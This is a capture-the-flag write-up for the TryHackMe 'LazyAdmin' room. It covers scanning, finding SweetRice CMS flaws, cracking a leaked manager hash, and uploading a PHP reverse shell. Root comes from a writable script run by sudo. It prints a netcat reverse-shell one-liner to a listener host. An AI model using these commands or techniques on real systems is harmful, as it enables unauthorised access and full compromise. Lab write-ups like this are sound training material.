---

title: lazyadmin

difficulty: easy

date: "2023-05-17"

author: MatDef

  

---

# Information Gathering

  

### Nmap 

```bash
nmap 10.10.203.28 -sC -sV | tee nmap.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 14:21 EDT
Nmap scan report for 10.10.118.199
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds

```


## Enumeration

### Nikito

```bash
nikto -h http://10.10.203.28    

```
->nothing really interesting
### gobuster
```shell
gobuster dir -u http://10.10.203.28 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
```
Found:
  `/content`
-> sweetrice CMS
```shell
searchsploit sweetrice
```
->SweetRice 1.5.1- Backup disclosure on '\http://10.10.203.28/content/inc/mysql_backup/'
-> SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution 
# Exploitation

mysqlbackup has manager password:
`manager:42f749ade7f9e195bf475f37a44cafcb`
crackstation:
`manager:Password123`

Cross-Site Request Forgery/PHP Code Execution
Able to put php code in Ads File
On `http://10.10.63.34/content/as/?type=ad&mode=save` and with manager credentials able to upload php file.
Created Pentestmonkey - php-reverse-shell with https://www.revshells.com/ and added to payload.

Got Access and user flag on `~/home/itguy`

# Privilege Escaltion
`sudo -l`
```shell
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
-> /home/itguy/backup.pl` runnable as without password`
```shell
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
copy.sh

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
-> reverseshell or just `echo "/bin/sh" > /etc/copy.sh`
Got Root Flag


  
  

---

  

# References

  

1. https://tryhackme.com/room/lazyadmin

  

<br>

  

___─ Written by MatDef ─___